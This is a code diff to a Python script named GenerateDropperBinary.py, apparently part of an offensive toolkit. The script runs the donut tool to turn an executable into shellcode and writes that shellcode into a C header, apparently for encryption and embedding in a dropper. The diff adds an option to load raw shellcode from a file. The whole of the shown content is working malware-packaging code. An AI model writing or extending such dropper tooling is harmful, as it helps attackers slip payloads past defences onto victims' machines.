@@ -46,15 +46,16 @@ def main(argv):
         fileEncrypt = open('cryptDef.h', 'w')
         fileClear = open('clearDef.h', 'r')
 
-        if(len(argv)<4):
+        if(len(argv)<2):
                 print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
                 print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
                 exit()
 
         binary=""
         binaryArgs=""
+        rawShellCode=""
 
-        opts, args = getopt.getopt(argv,"hb:a:",["binary=","args="])
+        opts, args = getopt.getopt(argv,"hb:a:r:",["binary=","args="])
         for opt, arg in opts:
                 if opt == '-h':
                         print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
@@ -64,6 +65,8 @@ def main(argv):
                         binary = arg
                 elif opt in ("-a", "--args"):
                         binaryArgs = arg
+                elif opt == '-r':
+                        rawShellCode = arg
         
         print('[+] Generate dropper for params:')
         print('binary ', binary)
@@ -72,18 +75,28 @@ def main(argv):
 
         #dllArgs = '{} {} {}'.format(ip, port, listenerType)
 
-        if os.name == 'nt':
-                args = ('.\\ressources\\donut.exe', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', '.\\dropper.bin', binary)
-        else:   
-                args = ('./ressources/donut', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', './dropper.bin', '-i' , binary)
-        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
-        popen.wait()
-        output = popen.stdout.read()
-        
-        print("[+] Generate shellcode of payload with donut")
-        print(output.decode("utf-8") )
+        if binary:
+                print('binary ', binary)
+                print('binaryArgs ', binaryArgs)
+                print('')
+                if os.name == 'nt':
+                        args = ('.\\ressources\\donut.exe', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', '.\\dropper.bin', binary)
+                else:   
+                        args = ('./ressources/donut', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', './dropper.bin', '-i' , binary)
+                popen = subprocess.Popen(args, stdout=subprocess.PIPE)
+                popen.wait()
+                output = popen.stdout.read()
+                
+                print("[+] Generate shellcode of payload with donut")
+                print(output.decode("utf-8") )
 
-        shellcode = open("dropper.bin", "rb").read()
+                shellcode = open("dropper.bin", "rb").read()
+
+        elif rawShellCode:
+                print('rawShellCode ', rawShellCode)
+                print('')
+
+                shellcode = open(rawShellCode, "rb").read()
 
         Lines = fileClear.readlines()
 
